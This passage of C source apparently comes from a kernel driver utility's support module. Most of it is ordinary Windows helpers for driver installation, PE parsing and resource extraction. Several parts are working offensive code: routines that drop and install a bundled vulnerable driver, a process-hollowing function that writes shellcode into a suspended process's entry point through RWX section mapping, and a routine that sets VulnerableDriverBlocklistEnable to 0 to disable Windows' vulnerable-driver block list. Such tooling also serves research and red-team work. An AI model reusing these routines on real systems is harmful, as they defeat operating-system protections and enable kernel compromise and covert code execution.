    va_end(args);

    //
    // Restore original text color.
    //
    SetConsoleTextAttribute(stdHandle, origColor);
}

/*
* supQueryImageSize
*
* Purpose:
*
* Get image size from PEB loader list.
*
*/
NTSTATUS supQueryImageSize(
    _In_ PVOID ImageBase,
    _Out_ PSIZE_T ImageSize
)
{
    NTSTATUS ntStatus;
    LDR_DATA_TABLE_ENTRY* ldrEntry = NULL;

    *ImageSize = 0;

    ntStatus = LdrFindEntryForAddress(
        ImageBase,
        &ldrEntry);

    if (NT_SUCCESS(ntStatus)) {

        *ImageSize = ldrEntry->SizeOfImage;

    }

    return ntStatus;
}

/*
* supxBinTextEncode
*
* Purpose:
*
* Create pseudo random string from UI64 value.
*
*/
VOID supxBinTextEncode(
    _In_ unsigned __int64 x,
    _Inout_ wchar_t* s
)
{
    char    tbl[64];
    char    c = 0;
    int     p;

    tbl[62] = '-';
    tbl[63] = '_';

    for (c = 0; c < 26; ++c)
    {
        tbl[c] = 'A' + c;
        tbl[26 + c] = 'a' + c;
        if (c < 10)
            tbl[52 + c] = '0' + c;
    }

    for (p = 0; p < 13; ++p)
    {
        c = x & 0x3f;
        x >>= 5;
        *s = (wchar_t)tbl[c];
        ++s;
    }

    *s = 0;
}

/*
* supGenRandom
*
* Purpose:
*
* Generate pseudo-random value via CNG.
*
*/
BOOL supGenRandom(
    _Inout_ PBYTE pbBuffer,
    _In_ DWORD cbBuffer
)
{
    BOOL bResult = FALSE;
    BCRYPT_ALG_HANDLE hAlgRng = NULL;

    do {

        if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(
            &hAlgRng,
            BCRYPT_RNG_ALGORITHM,
            NULL,
            0)))
        {
            break;
        }

        bResult = (NT_SUCCESS(BCryptGenRandom(
            hAlgRng,
            pbBuffer,
            cbBuffer,
            0)));

    } while (FALSE);

    if (hAlgRng)
        BCryptCloseAlgorithmProvider(hAlgRng, 0);

    return bResult;
}

/*
* supGenerateSharedObjectName
*
* Purpose:
*
* Create pseudo random object name from it ID.
*
*/
VOID supGenerateSharedObjectName(
    _In_ WORD ObjectId,
    _Inout_ LPWSTR lpBuffer
)
{
    ULARGE_INTEGER value;
    PIMAGE_NT_HEADERS ntHeaders = RtlImageNtHeader(NtCurrentPeb()->ImageBaseAddress);

    value.LowPart = MAKELONG(
        MAKEWORD(KDU_VERSION_BUILD, KDU_VERSION_REVISION),
        MAKEWORD(KDU_VERSION_MINOR, KDU_VERSION_MAJOR));

    value.HighPart = MAKELONG(ntHeaders->OptionalHeader.CheckSum, ObjectId);

    supxBinTextEncode(value.QuadPart, lpBuffer);
}

/*
* supxSetupInstallDriverFromInf
*
* Purpose:
*
* Install and load device driver through SetupAPI.
*
*/
BOOL supxSetupInstallDriverFromInf(
    _In_ LPCWSTR InfName,
    _In_ BYTE* HardwareId,
    _In_ ULONG HardwareIdLength,
    _Out_ HDEVINFO* DeviceInfo,
    _Inout_ SP_DEVINFO_DATA* DeviceInfoData,
    _In_ ULONG InstallFlags
)
{
    BOOL bResult = FALSE;
    GUID classGUID;
    HDEVINFO devInfoSet = NULL;
    WCHAR className[MAX_CLASS_NAME_LEN];

    *DeviceInfo = NULL;

    do {

        RtlSecureZeroMemory(&className, sizeof(className));

        //
        // Use the INF file to extract the class GUID.
        //
        if (!SetupDiGetINFClass(
            InfName,
            &classGUID,
            (PWSTR)&className,
            MAX_CLASS_NAME_LEN,
            NULL))
        {
            break;
        }

        //
        // Create the container for class GUID.
        //
        devInfoSet = SetupDiCreateDeviceInfoList(&classGUID, NULL);
        if (devInfoSet == INVALID_HANDLE_VALUE)
            break;

        DeviceInfoData->cbSize = sizeof(SP_DEVINFO_DATA);

        //
        // Create the element.
        //
        if (!SetupDiCreateDeviceInfo(devInfoSet,
            className,
            &classGUID,
            NULL,
            NULL,
            DICD_GENERATE_ID,
            DeviceInfoData))
        {
            break;
        }

        //
        // Add the HardwareID to the Device's HardwareID property.
        //
        if (!SetupDiSetDeviceRegistryProperty(devInfoSet,
            DeviceInfoData,
            SPDRP_HARDWAREID,
            HardwareId,
            HardwareIdLength))
        {
            break;
        }

        //
        // Transform the registry element into an actual devnode in the PnP HW tree.
        //
        if (!SetupDiCallClassInstaller(DIF_REGISTERDEVICE,
            devInfoSet,
            DeviceInfoData))
        {
            break;
        }

        bResult = UpdateDriverForPlugAndPlayDevices(NULL,
            (LPCWSTR)HardwareId,
            InfName,
            InstallFlags,
            NULL);

    } while (FALSE);

    if (bResult) {
        *DeviceInfo = devInfoSet;
    }
    else {
        if (devInfoSet && devInfoSet != INVALID_HANDLE_VALUE)
            SetupDiDestroyDeviceInfoList(devInfoSet);
    }

    return bResult;
}

/*
* supSetupManageFsFilterDriverPackage
*
* Purpose:
*
* Drop or remove required driver package files from disk in the current process directory.
*
*/
BOOL supSetupManageFsFilterDriverPackage(
    _In_ PVOID Context,
    _In_ BOOLEAN DoInstall,
    _In_ PSUP_SETUP_DRVPKG DriverPackage
)
{
    BOOL bResult = FALSE;
    LPWSTR lpFileName;
    KDU_CONTEXT* context = (KDU_CONTEXT*)Context;

    PUNICODE_STRING CurrentDirectory = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
    SIZE_T allocSize = 64 +
        _strlen(DriverPackage->InfFile) * sizeof(WCHAR) +
        CurrentDirectory->Length +
        sizeof(WCHAR);

    ULONG lastError = ERROR_SUCCESS;

    if (DoInstall) {

        //
        // Drop target driver.
        //
        if (!KDUProvExtractVulnerableDriver(context)) {
            SetLastError(ERROR_INTERNAL_ERROR);
            return FALSE;
        }
    }

    //
    // Drop inf file.
    //
    lpFileName = (LPWSTR)supHeapAlloc(allocSize);
    if (lpFileName) {

        StringCchPrintf(lpFileName, allocSize / sizeof(WCHAR), TEXT("%ws%ws"),
            CurrentDirectory->Buffer,
            DriverPackage->InfFile);

        if (supExtractFileFromDB(context->ModuleBase, lpFileName, DriverPackage->InfFileResourceId)) {

            WCHAR szCmd[MAX_PATH * 2];
            WCHAR szFileName[MAX_PATH * 2];

            StringCchPrintf(szCmd, ARRAYSIZE(szCmd),
                TEXT("%ws 132 %ws"),
                DoInstall ? TEXT("DefaultInstall") : TEXT("DefaultUninstall"),
                lpFileName);

#pragma warning(push)
#pragma warning(disable: 6387)
            InstallHinfSection(NULL, NULL, szCmd, 0);
#pragma warning(pop)

            //
            // Since it doesn't provide any way to check result we have to inspect changes ourself.
            //
            StringCchPrintf(szFileName, RTL_NUMBER_OF(szFileName), TEXT("%ws\\system32\\drivers\\%ws.sys"),
                USER_SHARED_DATA->NtSystemRoot,
                context->Provider->LoadData->DriverName);

            if (RtlDoesFileExists_U(szFileName)) {
                if (DoInstall)
                    bResult = TRUE;
                else
                    lastError = ERROR_FILE_EXISTS;
            }
            else {
                if (DoInstall)
                    lastError = ERROR_FILE_NOT_FOUND;
                else
                    bResult = TRUE;
            }

        }
        else {
            lastError = ERROR_FILE_NOT_FOUND;
        }
        supHeapFree(lpFileName);
    }
    else {
        lastError = ERROR_NOT_ENOUGH_MEMORY;
    }

    SetLastError(lastError);
    return bResult;
}

/*
* supSetupManagePnpDriverPackage
*
* Purpose:
*
* Drop or remove required driver package files from disk in the current process directory.
*
*/
BOOL supSetupManagePnpDriverPackage(
    _In_ PVOID Context,
    _In_ BOOLEAN DoInstall,
    _In_ PSUP_SETUP_DRVPKG DriverPackage
)
{
    BOOL bResult = FALSE;
    LPWSTR lpEnd;
    LPWSTR lpFileName;
    KDU_CONTEXT* context = (KDU_CONTEXT*)Context;

    PUNICODE_STRING CurrentDirectory = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
    SIZE_T allocSize = 64 +
        ((_strlen(DriverPackage->CatalogFile) + _strlen(DriverPackage->InfFile)) * sizeof(WCHAR)) +
        CurrentDirectory->Length +
        sizeof(WCHAR);

    ULONG length, lastError = ERROR_SUCCESS;

    if (DoInstall) {

        //
        // Drop target driver.
        //
        if (!KDUProvExtractVulnerableDriver(context)) {
            SetLastError(ERROR_INTERNAL_ERROR);
            return FALSE;
        }

        //
        // Drop cat and inf files.
        //
        lpFileName = (LPWSTR)supHeapAlloc(allocSize);
        if (lpFileName) {

            length = CurrentDirectory->Length / sizeof(WCHAR);

            //
            // Drop catalog file.
            //
            _strncpy(lpFileName,
                length,
                CurrentDirectory->Buffer,
                length);

            lpEnd = _strcat(lpFileName, L"\\");
            _strcat(lpFileName, DriverPackage->CatalogFile);
            if (supExtractFileFromDB(context->ModuleBase, lpFileName, DriverPackage->CatalogFileResourceId)) {

                //
                // Drop inf file.
                //
                *lpEnd = 0;
                _strcat(lpFileName, DriverPackage->InfFile);

                if (supExtractFileFromDB(context->ModuleBase, lpFileName, DriverPackage->InfFileResourceId)) {

                    //
                    // Install driver package.
                    //
                    bResult = supxSetupInstallDriverFromInf(lpFileName,
                        DriverPackage->Hwid,
                        DriverPackage->HwidLength,
                        &DriverPackage->DeviceInfo,
                        &DriverPackage->DeviceInfoData,
                        DriverPackage->InstallFlags);

                    if (!bResult)
                        lastError = GetLastError();

                }
            }
            else {
                lastError = ERROR_FILE_NOT_FOUND;
            }

            supHeapFree(lpFileName);
        }
        else {
            lastError = ERROR_NOT_ENOUGH_MEMORY;
        }
    }
    else {

        lpFileName = (LPWSTR)supHeapAlloc(allocSize);
        if (lpFileName) {

            length = CurrentDirectory->Length / sizeof(WCHAR);

            _strncpy(lpFileName,
                length,
                CurrentDirectory->Buffer,
                length);

            lpEnd = _strcat(lpFileName, L"\\");
            _strcat(lpFileName, DriverPackage->CatalogFile);
            DeleteFile(lpFileName);

            *lpEnd = 0;

            _strcat(lpFileName, DriverPackage->InfFile);
            DeleteFile(lpFileName);

            supHeapFree(lpFileName);
            bResult = TRUE;
        }
        else {
            lastError = ERROR_NOT_ENOUGH_MEMORY;
        }

    }

    SetLastError(lastError);
    return bResult;
}

/*
* supSetupRemoveDriver
*
* Purpose:
*
* Unload and remove device driver installed through SetupAPI.
*
*/
BOOL supSetupRemoveDriver(
    _In_ HDEVINFO DeviceInfo,
    _In_ SP_DEVINFO_DATA* DeviceInfoData
)
{
    if (DeviceInfo != INVALID_HANDLE_VALUE) {
        SetupDiRemoveDevice(DeviceInfo, DeviceInfoData);
        return SetupDiDestroyDeviceInfoList(DeviceInfo);
    }

    return FALSE;
}

/*
* supQueryDeviceProperty
*
* Purpose:
*
* Allocate space and read device property.
*
*/
BOOL supQueryDeviceProperty(
    _In_ HDEVINFO hDevInfo,
    _In_ SP_DEVINFO_DATA* pDevInfoData,
    _In_ ULONG Property,
    _Out_ LPWSTR* PropertyBuffer,
    _Out_opt_ ULONG* PropertyBufferSize
)
{
    BOOL   result = FALSE;
    DWORD  dataType = 0, dataSize, returnLength = 0;
    LPWSTR lpProperty = NULL;

    dataSize = (MAX_PATH * sizeof(WCHAR)) + sizeof(UNICODE_NULL);
    lpProperty = (LPWSTR)supHeapAlloc(dataSize);
    if (lpProperty) {

        result = SetupDiGetDeviceRegistryProperty(hDevInfo,
            pDevInfoData,
            Property,
            &dataType,
            (PBYTE)lpProperty,
            dataSize,
            &returnLength);

        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {

            supHeapFree(lpProperty);
            dataSize = returnLength;
            lpProperty = (LPWSTR)supHeapAlloc(dataSize);
            if (lpProperty) {

                result = SetupDiGetDeviceRegistryProperty(hDevInfo,
                    pDevInfoData,
                    Property,
                    &dataType,
                    (PBYTE)lpProperty,
                    dataSize,
                    &returnLength);

            }

        }

        if (!result) {
            if (lpProperty) {
                supHeapFree(lpProperty);
                lpProperty = NULL;
            }
            dataSize = 0;
        }

    }

    *PropertyBuffer = lpProperty;
    if (PropertyBufferSize)
        *PropertyBufferSize = returnLength;

    return result;
}

/*
* supSetupEnumDevices
*
* Purpose:
*
* Enumerate devices installed through SetupAPI.
*
*/
BOOL supSetupEnumDevices(
    _In_ pfnSetupDeviceEnumCallback Callback,
    _In_ PVOID CallbackParam
)
{
    BOOL bResult = FALSE;
    HDEVINFO deviceInfo;
    SP_DEVINFO_DATA deviceData;

    deviceInfo = SetupDiGetClassDevs(NULL, NULL, NULL, DIGCF_PRESENT | DIGCF_ALLCLASSES);
    if (deviceInfo == INVALID_HANDLE_VALUE)
        return FALSE;

    RtlSecureZeroMemory(&deviceData, sizeof(deviceData));
    deviceData.cbSize = sizeof(SP_DEVINFO_DATA);

    for (ULONG i = 0; SetupDiEnumDeviceInfo(deviceInfo, i, &deviceData); i++) {

        bResult = Callback(deviceInfo, &deviceData, CallbackParam);
        if (bResult) //found?
            break;

    }

    SetupDiDestroyDeviceInfoList(deviceInfo);

    return bResult;
}

/*
* supReplaceDllEntryPoint
*
* Purpose:
*
* Replace DLL entry point and optionally convert dll to exe.
*
*/
BOOL supReplaceDllEntryPoint(
    _In_ PVOID DllImage,
    _In_ ULONG SizeOfDllImage,
    _In_ LPCSTR lpEntryPointName,
    _In_ BOOL fConvertToExe
)
{
    BOOL bResult = FALSE;
    PIMAGE_NT_HEADERS NtHeaders;
    DWORD DllVirtualSize;
    PVOID DllBase, EntryPoint;

    NtHeaders = RtlImageNtHeader(DllImage);
    if (NtHeaders) {

        DllVirtualSize = 0;
        DllBase = PELoaderLoadImage(DllImage, &DllVirtualSize);
        if (DllBase) {
            //
            // Get the new entrypoint.
            //
            EntryPoint = PELoaderGetProcAddress(DllBase, (PCHAR)lpEntryPointName);
            if (EntryPoint) {
                //
                // Set new entrypoint and recalculate checksum.
                //
                NtHeaders->OptionalHeader.AddressOfEntryPoint =
                    (ULONG)((ULONG_PTR)EntryPoint - (ULONG_PTR)DllBase);

                if (fConvertToExe)
                    NtHeaders->FileHeader.Characteristics &= ~IMAGE_FILE_DLL;

                NtHeaders->OptionalHeader.CheckSum =
                    supCalculateCheckSumForMappedFile(DllImage, SizeOfDllImage);

                bResult = TRUE;
            }
            VirtualFree(DllBase, 0, MEM_RELEASE);
        }
    }
    return bResult;
}

/*
* supExtractFileFromDB
*
* Purpose:
*
* Extract requested file from resources.
*
*/
BOOL supExtractFileFromDB(
    _In_ HMODULE ImageBase,
    _In_ LPCWSTR FileName,
    _In_ ULONG FileId
)
{
    NTSTATUS ntStatus;
    ULONG resourceSize = 0, writeBytes = 0;
    PBYTE fileBuffer;

    fileBuffer = (PBYTE)KDULoadResource(FileId,
        ImageBase,
        &resourceSize,
        PROVIDER_RES_KEY,
        TRUE);

    if (fileBuffer == NULL) {

        supPrintfEvent(kduEventError,
            "[!] Requested data id cannot be found %lu\r\n", FileId);

        return FALSE;

    }

    writeBytes = (ULONG)supWriteBufferToFile(FileName,
        fileBuffer,
        resourceSize,
        TRUE,
        FALSE,
        &ntStatus);

    supHeapFree(fileBuffer);

    if (resourceSize != writeBytes) {
        supShowHardError("[!] Unable to extract data", ntStatus);
        return FALSE;
    }

    return TRUE;
}

/*
* supExtractFileToTemp
*
* Purpose:
*
* Save given file to local %temp%.
*
*/
VOID supExtractFileToTemp(
    _In_opt_ HMODULE ImageBase,
    _In_opt_ ULONG FileResourceId,
    _In_ LPCWSTR lpTempPath,
    _In_ LPCWSTR lpFileName,
    _In_ BOOL fDelete)
{
    WCHAR szFileName[MAX_PATH * 2];

    RtlSecureZeroMemory(&szFileName, sizeof(szFileName));
    StringCchPrintf(szFileName,
        MAX_PATH * 2,
        TEXT("%ws\\%ws"),
        lpTempPath,
        lpFileName);

    if (fDelete) {
        DeleteFile(szFileName);
    }
    else {
        if (ImageBase) {
            supExtractFileFromDB(ImageBase, szFileName, FileResourceId);
        }
    }
}

/*
* supDeleteFileWithWait
*
* Purpose:
*
* Removes file from disk.
*
*/
BOOL supDeleteFileWithWait(
    _In_ ULONG WaitMilliseconds,
    _In_ ULONG NumberOfAttempts,
    _In_ LPCWSTR lpFileName
)
{
    ULONG retryCount = NumberOfAttempts;

    do {

        Sleep(WaitMilliseconds);
        if (DeleteFile(lpFileName)) {
            return TRUE;
        }

        retryCount--;

    } while (retryCount);

    return FALSE;
}

/*
* supMapFileAsImage
*
* Purpose:
*
* Create file mapping with SEC_IMAGE flag.
*
*/
PVOID supMapFileAsImage(
    _In_ LPWSTR lpImagePath
)
{
    HANDLE hFile, hMapping = NULL;
    PVOID  pvImageBase = NULL;

    hFile = CreateFile(lpImagePath,
        GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        hMapping = CreateFileMapping(hFile,
            NULL,
            PAGE_READONLY | SEC_IMAGE,
            0,
            0,
            NULL);

        if (hMapping != NULL) {

            pvImageBase = MapViewOfFile(hMapping,
                FILE_MAP_READ, 0, 0, 0);

            CloseHandle(hMapping);
        }
        CloseHandle(hFile);
    }
    return pvImageBase;
}

/*
* supGetEntryPointForMappedFile
*
* Purpose:
*
* Return adjusted entry point address within mapped file.
*
*/
PVOID supGetEntryPointForMappedFile(
    _In_ PVOID ImageBase
)
{
    PIMAGE_DOS_HEADER		 dosHeader = (PIMAGE_DOS_HEADER)ImageBase;
    PIMAGE_FILE_HEADER		 fileHeader = (PIMAGE_FILE_HEADER)((PBYTE)dosHeader + sizeof(DWORD) + dosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER32 oh32 = (PIMAGE_OPTIONAL_HEADER32)((PBYTE)fileHeader + sizeof(IMAGE_FILE_HEADER));
    PIMAGE_OPTIONAL_HEADER64 oh64 = (PIMAGE_OPTIONAL_HEADER64)((PBYTE)fileHeader + sizeof(IMAGE_FILE_HEADER));

    if (fileHeader->Machine == IMAGE_FILE_MACHINE_I386) {
#pragma warning(push)
#pragma warning(disable: 4312)
        return RtlOffsetToPointer(oh32->ImageBase, oh32->AddressOfEntryPoint);
#pragma warning(pop)
    }
    else if (fileHeader->Machine == IMAGE_FILE_MACHINE_AMD64) {
        return RtlOffsetToPointer(oh64->ImageBase, oh64->AddressOfEntryPoint);
    }
    else
        return NULL;
}

/*
* supInjectPayload
*
* Purpose:
*
* Run payload shellcode at app entry point.
*
*/
NTSTATUS supInjectPayload(
    _In_ PVOID pvTargetImage,
    _In_ PVOID pbShellCode,
    _In_ ULONG cbShellCode,
    _In_ LPWSTR lpTargetModule,
    _Out_ PHANDLE phZombieProcess
)
{
    NTSTATUS                    ntStatus;
    ULONG                       offset, returnLength = 0;
    HANDLE                      sectionHandle = NULL;

    PIMAGE_DOS_HEADER           dosHeader;
    PIMAGE_FILE_HEADER          fileHeader;
    PIMAGE_OPTIONAL_HEADER      optHeader;

    LPVOID                      pvImageBase = NULL, pvLocalBase;
    SIZE_T                      viewSize, readBytes = 0;
    LARGE_INTEGER               secMaxSize;

    PROCESS_BASIC_INFORMATION   processBasicInfo;
    PROCESS_INFORMATION         processInfo;
    STARTUPINFO                 startupInfo;

    do {

        *phZombieProcess = NULL;

        RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
        startupInfo.cb = sizeof(startupInfo);

        processInfo.hProcess = NULL;
        processInfo.hThread = NULL;

        dosHeader = (PIMAGE_DOS_HEADER)pvTargetImage;
        fileHeader = (PIMAGE_FILE_HEADER)((PBYTE)dosHeader + sizeof(DWORD) + dosHeader->e_lfanew);
        optHeader = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileHeader + sizeof(IMAGE_FILE_HEADER));
        secMaxSize.QuadPart = optHeader->SizeOfImage;

        if (fileHeader->Machine != IMAGE_FILE_MACHINE_I386 &&
            fileHeader->Machine != IMAGE_FILE_MACHINE_AMD64)
        {
            ntStatus = STATUS_NOT_SUPPORTED;
            break;
        }

        ntStatus = NtCreateSection(&sectionHandle,
            SECTION_ALL_ACCESS,
            NULL,
            &secMaxSize,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            NULL);

        if (!NT_SUCCESS(ntStatus)) {
            break;
        }

        SetLastError(0);

        if (!CreateProcess(NULL,
            lpTargetModule,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED | NORMAL_PRIORITY_CLASS,
            NULL,
            NULL,
            &startupInfo,
            &processInfo))
        {
            ntStatus = STATUS_FATAL_APP_EXIT;
            break;
        }

        ntStatus = NtQueryInformationProcess(processInfo.hProcess,
            ProcessBasicInformation,
            &processBasicInfo,
            sizeof(PROCESS_BASIC_INFORMATION),
            &returnLength);

        if (!NT_SUCCESS(ntStatus)) {
            break;
        }

        offset = FIELD_OFFSET(PEB, ImageBaseAddress);

        if (!ReadProcessMemory(processInfo.hProcess,
            RtlOffsetToPointer(processBasicInfo.PebBaseAddress, offset),
            &pvImageBase,
            sizeof(PVOID),
            &readBytes))
        {
            ntStatus = STATUS_UNEXPECTED_IO_ERROR;
            break;
        }

        viewSize = optHeader->SizeOfImage;
        pvLocalBase = NULL;

        ntStatus = NtMapViewOfSection(sectionHandle,
            NtCurrentProcess(),
            &pvLocalBase,
            0,
            optHeader->SizeOfImage,
            NULL,
            &viewSize,
            ViewUnmap,
            0,
            PAGE_EXECUTE_READWRITE);

        if (!NT_SUCCESS(ntStatus)) {
            break;
        }

        if (!ReadProcessMemory(processInfo.hProcess,
            pvImageBase,
            pvLocalBase,
            optHeader->SizeOfImage,
            &readBytes))
        {
            ntStatus = STATUS_UNEXPECTED_IO_ERROR;
            break;
        }

        ntStatus = NtUnmapViewOfSection(processInfo.hProcess, pvImageBase);

        if (!NT_SUCCESS(ntStatus)) {
            break;
        }

        viewSize = optHeader->SizeOfImage;

        ntStatus = NtMapViewOfSection(sectionHandle,
            processInfo.hProcess,
            &pvImageBase,
            0,
            optHeader->SizeOfImage,
            NULL,
            &viewSize,
            ViewShare,
            0,
            PAGE_EXECUTE_READWRITE);

        if (!NT_SUCCESS(ntStatus)) {
            break;
        }

        RtlCopyMemory(RtlOffsetToPointer(pvLocalBase, optHeader->AddressOfEntryPoint),
            pbShellCode,
            cbShellCode);

        ResumeThread(processInfo.hThread);

        *phZombieProcess = processInfo.hProcess;

    } while (FALSE);

    if (!NT_SUCCESS(ntStatus)) {

        if (processInfo.hProcess != NULL)
            CloseHandle(processInfo.hProcess);

    }

    if (sectionHandle != NULL)
        NtClose(sectionHandle);

    if (processInfo.hThread != NULL)
        CloseHandle(processInfo.hThread);

    return ntStatus;
}

/*
* supFilterDeviceIoControl
*
* Purpose:
*
* Call filter driver.
*
* Simplified fltlib!FilterpDeviceIoControl
*
*/
NTSTATUS supFilterDeviceIoControl(
    _In_ HANDLE Handle,
    _In_ ULONG IoControlCode,
    _In_reads_bytes_(InBufferSize) PVOID InBuffer,
    _In_ ULONG InBufferSize,
    _Out_writes_bytes_to_opt_(OutBufferSize, *BytesReturned) PVOID OutBuffer,
    _In_ ULONG OutBufferSize,
    _Out_opt_ PULONG BytesReturned
)
{
    NTSTATUS ntStatus;

    if (BytesReturned)
        *BytesReturned = 0;

    IO_STATUS_BLOCK ioStatusBlock;

    if (DEVICE_TYPE_FROM_CTL_CODE(IoControlCode) == FILE_DEVICE_FILE_SYSTEM) {
        ntStatus = NtFsControlFile(Handle,
            NULL,
            NULL,
            NULL,
            &ioStatusBlock,
            IoControlCode,
            InBuffer,
            InBufferSize,
            OutBuffer,
            OutBufferSize);
    }
    else {

        ntStatus = NtDeviceIoControlFile(Handle,
            NULL,
            NULL,
            NULL,
            &ioStatusBlock,
            IoControlCode,
            InBuffer,
            InBufferSize,
            OutBuffer,
            OutBufferSize);
    }

    if (ntStatus == STATUS_PENDING) {
        ntStatus = NtWaitForSingleObject(Handle, FALSE, NULL);
        if (NT_SUCCESS(ntStatus))
            ntStatus = ioStatusBlock.Status;
    }

    if (BytesReturned)
        *BytesReturned = (ULONG)ioStatusBlock.Information;

    return ntStatus;
}

/*
* supQueryPhysicalMemoryLayout
*
* Purpose:
*
* Read physical memory layout from registry.
* 
* Use supHeapFree to release allocated memory.
*
*/
PCM_RESOURCE_LIST supQueryPhysicalMemoryLayout(
    VOID
)
{
    LPCWSTR lpKey = L"HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory";
    LPCWSTR lpValue = L".Translated";
    HKEY hKey;
    DWORD dwType = REG_RESOURCE_LIST, cbData = 0;
    PCM_RESOURCE_LIST pList = NULL;

    LRESULT result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpKey, 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {

        result = RegQueryValueEx(hKey, lpValue, 0, &dwType, NULL, &cbData);

        if (result == ERROR_SUCCESS && dwType == REG_RESOURCE_LIST) {

            pList = (PCM_RESOURCE_LIST)supHeapAlloc((SIZE_T)cbData);
            if (pList) {
                RegQueryValueEx(hKey, lpValue, 0, &dwType, (LPBYTE)pList, &cbData);
            }
        }

        RegCloseKey(hKey);
    }

    return pList;
}

/*
* supEnumeratePhysicalMemory
*
* Purpose:
*
* Enumerate physical memory and run callback for each page.
*
*/
BOOL supEnumeratePhysicalMemory(
    _In_ pfnPhysMemEnumCallback Callback,
    _In_ PVOID UserContext
)
{
    PCM_PARTIAL_RESOURCE_DESCRIPTOR pPartialDesc;
    PCM_FULL_RESOURCE_DESCRIPTOR pDesc;
    PCM_RESOURCE_LIST pList = supQueryPhysicalMemoryLayout();

    if (pList == NULL) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        return FALSE;
    }

    for (ULONG i = 0; i < pList->Count; i++) {

        pDesc = &pList->List[i];

        for (ULONG j = 0; j < pDesc->PartialResourceList.Count; j++) {

            pPartialDesc = &pDesc->PartialResourceList.PartialDescriptors[j];
            if (pPartialDesc->Type == CmResourceTypeMemory ||
                pPartialDesc->Type == CmResourceTypeMemoryLarge)
            {
                ULONGLONG length = pPartialDesc->u.Memory.Length;

                switch (pPartialDesc->Flags & CM_RESOURCE_MEMORY_LARGE)
                {
                case CM_RESOURCE_MEMORY_LARGE_40:
                    length <<= 8;
                    break;
                case CM_RESOURCE_MEMORY_LARGE_48:
                    length <<= 16;
                    break;
                case CM_RESOURCE_MEMORY_LARGE_64:
                    length <<= 32;
                    break;
                }

                ULONG_PTR endAddress, queryAddress;
                ULONG x = 0;

                queryAddress = pPartialDesc->u.Memory.Start.QuadPart;
                endAddress = queryAddress + length;

                supPrintfEvent(kduEventInformation, 
                    "[+] Enumerating memory address range 0x%llX -> 0x%llX\r\n", queryAddress, endAddress);

                do {

                    if (x == 0) {
                        printf_s("\r\tProbing memory at 0x%llX with size 0x%llX", queryAddress, PAGE_SIZE * 16);
                        x = 16;
                    }

                    if (Callback(queryAddress, UserContext)) {
                        break;
                    }

                    queryAddress += PAGE_SIZE;
                    --x;

                } while (queryAddress < endAddress);

                printf_s("\33[2K\r\tAddress range probed successfully\r\n");
            }
        }
    }

    supHeapFree(pList);

    return TRUE;
}

/*
* supDetectMsftBlockList
*
* Purpose:
*
* Return state of CI variable enabling/disabling msft block list.
* Windows 11 22H2+ (build >= 22621): missing value = enabled (default).
* Older Windows 10: missing value treated as enabled only if HVCI active, otherwise disabled.
*
*/
BOOL supDetectMsftBlockList(
    _In_ PBOOL Enabled,
    _In_ BOOL Disable,
    _In_ ULONG NtBuildNumber,
    _In_ BOOL HvciActive
)
{
    HKEY hKey;
    DWORD dwEnabled, cbData, dwType;
    LSTATUS r;
    BOOL haveValue, isWin11, success;

    isWin11 = (NtBuildNumber >= NT_WIN11_22H2);
    if (Enabled)
        *Enabled = isWin11 ? TRUE : (HvciActive ? TRUE : FALSE);

    hKey = NULL;
    haveValue = FALSE;

    r = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
        L"System\\CurrentControlSet\\Control\\CI\\Config",
        0,
        Disable ? (KEY_QUERY_VALUE | KEY_SET_VALUE) : KEY_QUERY_VALUE,
        &hKey);

    if (r == ERROR_FILE_NOT_FOUND && Disable) {
        r = RegCreateKeyEx(HKEY_LOCAL_MACHINE,
            L"System\\CurrentControlSet\\Control\\CI\\Config",
            0, NULL, REG_OPTION_NON_VOLATILE,
            KEY_SET_VALUE | KEY_QUERY_VALUE,
            NULL, &hKey, NULL);
    }

    if (r == ERROR_SUCCESS) {

        cbData = sizeof(DWORD);
        dwType = REG_DWORD;
        dwEnabled = 0;
        r = RegQueryValueEx(hKey,
            L"VulnerableDriverBlocklistEnable",
            0,
            &dwType,
            (LPBYTE)&dwEnabled,
            &cbData);

        if (r == ERROR_SUCCESS && dwType == REG_DWORD) {
            haveValue = TRUE;
            if (Enabled)
                *Enabled = (dwEnabled > 0);
        }
        else if (r == ERROR_FILE_NOT_FOUND) {
            r = ERROR_SUCCESS;
        }

        if (Disable && r == ERROR_SUCCESS) {
            if (!haveValue || dwEnabled != 0) {
                dwEnabled = 0;
                cbData = sizeof(DWORD);
                if (RegSetValueEx(hKey,
                    L"VulnerableDriverBlocklistEnable",
                    0,
                    REG_DWORD,
                    (LPBYTE)&dwEnabled,
                    cbData) != ERROR_SUCCESS)
                {
                    r = GetLastError();
                }
            }
            if (r == ERROR_SUCCESS && Enabled)
                *Enabled = FALSE;
        }

        RegCloseKey(hKey);
    }
    else if (r == ERROR_FILE_NOT_FOUND) {
        r = ERROR_SUCCESS;
    }

    if (r == ERROR_SUCCESS && !haveValue && !Disable && Enabled) {
        if (isWin11)
            *Enabled = TRUE;
        else
            *Enabled = HvciActive ? TRUE : FALSE;
    }

    success = (r == ERROR_SUCCESS);
    SetLastError((DWORD)r);
    return success;
}

/*
* supIsSupportedCpuVendor
*
* Purpose:
*
* Check if the current CPU vendor is match to supplied.
*
*/
BOOL supIsSupportedCpuVendor(
    _In_ LPCSTR Vendor,
    _In_ ULONG Length
)
{
    CHAR vendorString[0x20];

    RtlFillMemory(vendorString, sizeof(vendorString), 0);
    GET_CPU_VENDOR_STRING(vendorString);

    return (_strncmp_a(vendorString, Vendor, Length) == 0);
}

/*
* supResolveMiPteBaseAddress
*
* Purpose:
*
* Query MiPteBase address in kernel.
*
*/
